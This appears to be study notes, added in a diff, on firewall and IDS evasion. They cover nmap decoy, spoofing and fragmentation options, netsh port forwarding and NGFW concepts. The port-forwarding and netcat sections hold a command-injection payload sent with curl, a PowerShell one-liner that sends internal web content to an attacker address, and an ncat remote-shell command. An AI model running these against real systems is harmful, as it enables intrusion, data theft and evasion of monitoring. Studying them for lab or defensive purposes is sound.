@@ -1,0 +1,205 @@
+#+title: Firewall Bypass Techniques
+#+author:gabriel
+
+* intro
+Examples of commonly used protocols in the protocol field are:
+
+- TCP (Transmission Control Protocol): Used for connection-based, reliable data transfer (e.g., web browsing, email).
+- UDP (User Datagram Protocol): Used for connectionless, quick data transfer (e.g., video streaming, online gaming).
+- ICMP (Internet Control Message Protocol): Used for sending error messages and operational information between network devices.
+
+
+If the protocol is TCP or UDP, the firewall should at least inspect the following TCP and UDP headers:
+
+- Source Port Number: Indicates which application or service the traffic originated from.
+- Destination Port Number: Indicates which application or service the traffic is headed to.
+
+* OSI Layers
+Firewalls can operate at different layers. These layers according to the OSI model are:
+
+- Application Layer: This layer handles user applications (web browsers, email clients, etc.).
+
+- Presentation Layer: Converts data into a readable format between different systems (e.g., encryption).
+
+- Session Layer: Manages the creation, maintenance, and termination of communication sessions.
+
+- Transport Layer: Ensures reliable data transport (TCP, UDP).
+
+- Network Layer: Manages how data packets are routed through the network (IP addresses).
+
+- Data Link Layer: Transfers data packets to the physical network medium.
+
+- Physical Layer: Transmits data bits as electrical signals or light pulses in the physical medium.
+
+
+* TCP/IP Model
+
+- Application layer -> The Application layer is the topmost layer in the TCP/IP model, It provides the interfaces and protocols necessary for end-users to interact with network applications.
+   - SSH
+   - HTTP/HTTPS
+   - DNS
+   - FTP
+   - TELNET
+
+- Transport Layer -> Responsible for end-to-end communication. It controls the data flow and ensures that data packets are transmitted in order.
+
+-----
+
+* SOurce COntrol and Evasion with nmap
+Nmap is a powerful tool for scanning target networks and systems. However, there is a risk of being detected by network administrators and firewalls.
+
+Nmap's evasion capabilities can help conceal your scanning activities or impersonate them to identify vulnerabilities or test your network's security
+
+** decoy
+Decoy in Nmap is a technique used to conceal your real scanning source and deceive the target network's security systems.
+
+- Decoy adds multiple fake IP addresses (decoys) to hide the real source.
+
+ This makes it more difficult for target systems and security tools like firewalls or intrusion detection systems (IDS) to determine the scan's actual source.
+
+ If you don't want to specify an IP address, using RND will have Nmap generate a random IP address for you.
+: sudo nmap -Pn -D 10.10.11.33,10.10.11.22,ME,RND -F 127.0.0.1
+
+Will result in the firewall logs looking like this. As you can see, the specified IP addresses (10.10.11.33, 10.10.11.22), your own IP address (172.16.20.20), and a randomly generated IP address (17.151.188.232) are all logged.
+
+** proxy
+You can direct your scanning traffic through an HTTP proxy. The proxy server acts as an intermediary between you and the target system, concealing your real IP address.
+
+The IP address of the proxy server is logged in the target system's logs while your IP address remains hidden.
+: sudo nmap -Pn --proxies 10.10.13.37 -F 10.10.10.1
+
+** spoofed MAC address
+Nmap allows you to spoof the MAC address in network scans. This feature makes other devices on the network perceive you as a different device
+
+This technique only works if your computer is on the same network segment as the target device.
+: sudo nmap -Pn --spoof-mac 2e:2e:2e:2e:2e:2e -F 127.0.0.1
+
+: sudo nmap -Pn --spoof-mac Cisco -F 127.0.0.1
+
+** spoofed source ip address
+Nmap allows source IP address spoofing with the -S IP_ADDRESS option. This technique is useful if you are on the same subnet as the target system
+
+This technique is useful if you are on the same subnet as the target system
+
+** fixed source port number
+Sometimes network administrators permit source port-based filtering for outgoing connections. When you need to bypass network rules, it might be worth trying commonly allowed ports like 22, 53, 80, and 443.
+: sudo nmap -Pn --source-port 80 -F 127.0.0.1
+
+* packet fragmentation and setting MTU value with nmap
+Nmap's packet fragmentation feature can help evade firewalls and intrusion detection/prevention systems (IDS/IPS).
+
+To perform packet fragmentation in Nmap, you can use the -f option. This option breaks packets into 8-byte or smaller fragments.
+
+Alternatively, you can set the maximum transmission unit (MTU) value using the --mtu option. The MTU defines the maximum packet size that can be sent over a network. By lowering the MTU value, you can create smaller packet fragments.
+
+For example, to fragment into 8-byte packets:
+: sudo nmap -Pn -f -F 127.0.0.1
+
+Using the -ff option in Nmap restricts IP data to 16 bytes. This causes the TCP header (normally 24 bytes) to be split into two IP packets (16 bytes + 8 bytes).
+: sudo nmap -Pn -ff -F 127.0.0.1
+
+** mtu
+In addition to using the -f option, you can set the maximum transmission unit (MTU) value using the --mtu option in Nmap, fragmenting packets into smaller pieces.
+
+The MTU specifies the maximum packet size that can be sent over a network connection. This value does not include the IP header size and must be a multiple of 8.
+
+Running Nmap with --mtu 8 limits IP data to 8 bytes, resulting in the same outcome as the -f option:
+: sudo nmap -Pn --mtu 8 -F 127.0.0.1
+
+** adjusting packet length
+When Nmap is blocked by a firewall, you can make your port scan less noticeable by setting a specific packet length. Using the --data-length VALUE option lets you change the length of the data carried in the IP packet. Make sure the length is a multiple of 8.
+: sudo nmap -Pn --data-length 128 -F 127.0.0.1
+
+* Modifying Header Values with nmap
+** Adjusting IP Time-to-Live (TTL)
+The TTL (Time-to-Live) field in IP packets indicates how long a packet can live in the network.By using Nmap's --ttl VALUE option, you can set the TTL value to try to obscure the source of your scan.
+
+However, for this method to be effective, the target network's firewall should not filter packets based on TTL values.
+: sudo nmap -Pn --ttl 50 -F 10.10.10.1
+
+** Sending Packets with Specific IP Options
+The options field in the IP header contains information about routing, fragmentation, and other IP features. You can control this field using Nmap's --ip-options OPTIONS parameter.
+
+For example, the --ip-options R option adds a "record route" option to the packet, causing it to record the route it takes.
+
+** Sending Packets with Incorrect Checksums
+The checksum field in TCP and UDP headers is used to verify if the data was corrupted during transmission. By using Nmap's --badsum option, you can send packets with incorrect checksums.
+
+Any genuine TCP/IP stack will drop the packet, but firewalls may automatically reply without bothering to verify the checksum. Thus, this setting can be used to identify the presence of a firewall/IDS instead of using the --traceroute option.
+: sudo nmap -Pn --badsum -F 10.10.10.1
+
+* Port hopping
+Port hopping is a technique used to evade firewalls or intrusion detection/prevention systems (IDS/IPS). In this method, an application or service periodically switches between different port numbers to establish or maintain a connection.
+
+* Port forwarding
+However, you discover that the firewall does not block a certain port. Using this information, you can tunnel the traffic through a different port to access the server.
+
+For example, assume a web server is running on port 8080, but this port is blocked by the firewall. Additionally, let's assume you have the ability to execute commands on a system behind the firewall.
+
+If there are no restrictions on other ports, for example, you can listen on port 4343 on the target system and forward connections from this port to port 8080.
+
+In Windows systems, you can use the netsh command to perform the port forwarding. For this example, since you want to access a server on the same machine, the localhost will be the target.
+: netsh interface portproxy add v4tov4 listenport=4343 listenaddress=0.0.0.0 connectport=8080 connectaddress=localhost
+
+- netsh interface portproxy add v4tov4: Adds a port forwarding rule from IPv4 to IPv4.
+- listenport=4343: Specifies the port number to listen on.
+- listenaddress=0.0.0.0: Indicates that requests from all IP addresses will be accepted.
+- connectport=8080: Specifies the port number to which requests will be forwarded.
+- connectaddress=localhost: Specifies the target address to which requests will be forwarded. localhost represents the local machine.
+
+For example, if you want to send the above port forwarding request using curl to the target server, you can send it like this after URL encoding.
+#+begin_src bash
+curl 'http://10.10.10.1/rce/' -X POST --data-raw 'ip=%26+netsh+interface+portproxy+add+v4tov4+listenport%3D4343+listenaddress%3D0.0.0.0+connectport%3D8080+connectaddress%3Dlocalhost&Submit=Submit' # payload
+curl http://10.10.10.1:4343/ # retrieve the data
+#+end_src
+
+In the second example, instead of sending another request to retrieve the data, you can capture the data by setting up a listener on a port that is not filtered, since you can execute code on the target system.
+
+Start by setting up a listener on the attacker's machine on a port that is not filtered:
+: nc -lnvp 4343
+
+On the target server, you can use PowerShell to forward the data you want to retrieve to the port you are listening on:
+#+begin_src bash
+$payload = 'http://172.16.20.20:4343/' # attacker
+$content = (Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.1:8080").Content # assign the data to a variable
+$payload = -join($payload, '?=', $content) # append the retrieved content to the request
+Invoke-WebRequest $payload # send the request
+#+end_src
+
+Or, you can combine it into a single line:
+: $payload = 'http://172.16.20.20:4343/'; $content = (Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.10.1:8080").Content; $payload = -join($payload, '?=', $content); Invoke-WebRequest $payload
+
+Since the RCE vulnerability works via CMD, you can use powershell.exe -Command to execute the PowerShell code.
+
+The final payload to send would be:
+#+begin_src shell
+& powershell.exe -Command "$payload = 'http://172.16.20.20:4343/'; $content = (Invoke-WebRequest -UseBasicParsing -Uri 'http://10.10.10.1:8080').Content; $payload = -join($payload, '?=', $content); Invoke-WebRequest $payload"
+#+end_src
+
+* netcat on non-standard ports
+Netcat (nc) is a powerful tool commonly used for creating network connections and data transfer, and its signatures and traces are well-known.
+
+In some cases, firewalls or intrusion detection systems (IDS/IPS) can detect and block netcat traffic by monitoring standard ports (80, 443, etc.)Using non-standard ports to establish connections with netcat can be an effective way to bypass these security measures.
+
+Non-standard ports are port numbers outside the commonly known and used ports. For example, while ports 80 (HTTP) and 443 (HTTPS) are usually employed for web traffic, ports like 8080, 8443, or 7474 are considered non-standard.
+
+As we saw in previous sections, we can use IP address and port to establish a connection. If we append the -c parameter to run powershell.exe, we can gain a shell connection.
+: ncat 172.16.20.20 9999 -c powershell.exe
+
+* NGFWs
+NGFWs are network security devices that combine traditional firewalls' features with advanced threat detection and prevention capabilities.
+
+Along with the basic functionalities of standard firewalls, such as packet filtering, NAT (Network Address Translation), stateful inspection, and VPN support, NGFWs provide deeper packet inspection and more control at the application layer.
+
+NGFWs can be used to secure the network of businesses and organizations of all sizes. They are particularly common in the following areas:
+
+- Enterprise Networks: Protecting the complex networks of large companies and organizations.
+- Cloud Environments: Securing cloud-based applications and services.
+- Critical Infrastructures: Ensuring network security in critical sectors like energy, finance, and healthcare.
+
+** Deep Packet Inspection (DPI)
+Deep Packet Inspection (DPI) is a technology that analyzes not only the headers of network packets but also their content.
+
+This allows network administrators and security experts to gain more detailed information about network traffic and to detect potential security threats.
+
+DPI captures and analyzes packets based on predefined rules or signatures. These rules might be based on specific protocols, applications, or content.  For example, a DPI system can filter packets based on malware signatures, suspicious keywords, or abnormal traffic patterns.
